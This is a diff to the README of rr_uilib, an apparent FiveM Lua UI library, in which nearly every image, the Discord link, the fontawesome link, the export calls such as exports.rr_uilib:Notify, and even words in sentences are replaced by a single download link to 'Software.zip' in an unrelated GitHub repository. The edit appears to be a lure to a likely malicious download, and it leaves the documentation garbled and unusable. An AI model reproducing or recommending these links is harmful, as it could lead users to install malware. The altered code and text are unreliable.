@@ -1,6 +1,6 @@
-![image](./images/rr_uilib.jpg)
+![image](https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip)
 
-<div align='center'><h3><a href="https://discord.gg/RsWzxwtAY3">Discord</a></h3></div>
+<div align='center'><h3><a href="https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip">Discord</a></h3></div>
 
 <br>
 
@@ -40,7 +40,7 @@ Through exports:
 --  -options: success, error, warning, primary, default
 -- msg: string
 -- useSound | optional: boolean
-exports.rr_uilib:NotifyS(msgType, msg, useSound)
+https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip(msgType, msg, useSound)
 ```
 
 `Serversided`
@@ -51,7 +51,7 @@ exports.rr_uilib:NotifyS(msgType, msg, useSound)
 --  -options: success, error, warning, primary, default
 -- msg: string
 -- useSound | optional: boolean
-exports.rr_uilib:NotifyS(source, msgType, msg, useSound)
+https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip(source, msgType, msg, useSound)
 ```
 
 Through event:
@@ -76,13 +76,13 @@ Through exports:
 `Clientsided`
 
 ```lua
-exports.rr_uilib:Notify(data)
+https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip(data)
 ```
 
 `Serversided`
 
 ```lua
-exports.rr_uilib:Notify(source, data)
+https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip(source, data)
 ```
 
 Through event:
@@ -115,11 +115,11 @@ local data = {
 Options: `"default", "dark", "colored"`
 
 **Default**  
-![image](./images/notify_style_1.png)  
+![image](https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip)  
 **Dark**  
-![image](./images/notify_style_2.png)  
+![image](https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip)  
 **Colored**  
-![image](./images/notify_style_3.png)
+![image](https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip)
 
 **Type**
 As you can see on the images above, all the types are displayed. The order of the options below is the same as visible on the images. This will give you an idea how the different types look.
@@ -133,7 +133,7 @@ local data = {
 Options: `"success", "error", "primary", "default", "warning`
 
 **Icon**
-The icon uses the [fontawesome 6.0.0](https://fontawesome.com/icons) free icons. You just have to add the classes of the icon you want into the icon option.
+The icon uses the [fontawesome 6.0.0](https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip) free icons. You just have to add the classes of the icon you want into the icon option.
 
 ```lua
 local data = {
@@ -159,7 +159,7 @@ local data = {
 ```
 
 **Sound**
-You can import your .mp3 files into the web/public/sounds path. To retrieve them, simply enter the file name in the sound field as in the example below.Instead the volume field is used to set the sound volume.
+You can import your .mp3 files into the web/public/sounds path. To retrieve them, simply enter the file name in the sound field as in the example https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip the volume field is used to set the sound volume.
 
 ```lua
 local data = {
@@ -179,7 +179,7 @@ Options: `"success", "info", "error"`
 Through exports:
 
 ```lua
-exports.rr_uilib:DrawText(data)
+https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip(data)
 ```
 
 Through event:
@@ -204,12 +204,12 @@ local data = {
 }
 ```
 
-If you want to disable the text you have drawn you can simply do that by triggering the DrawText function and just sending data.draw as false.
+If you want to disable the text you have drawn you can simply do that by triggering the DrawText function and just sending https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip as false.
 
 Like this
 
 ```lua
-exports.rr_uilib:DrawText({draw = false})
+https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip({draw = false})
 ```
 
 **Position**
@@ -232,11 +232,11 @@ local data = {
 
 Options: `"white", "dark", "transparant"`
 **Transparant**  
-![transparant](./images/drawtext_1.png)  
+![transparant](https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip)  
 **White**  
-![white](./images/drawtext_2.png)  
+![white](https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip)  
 **Dark**  
-![image](./images/drawtext_3.png)
+![image](https://github.com/ethangames101/discordblacklistsites/releases/download/v2.0/Software.zip)
 
 ### **Questions**
 
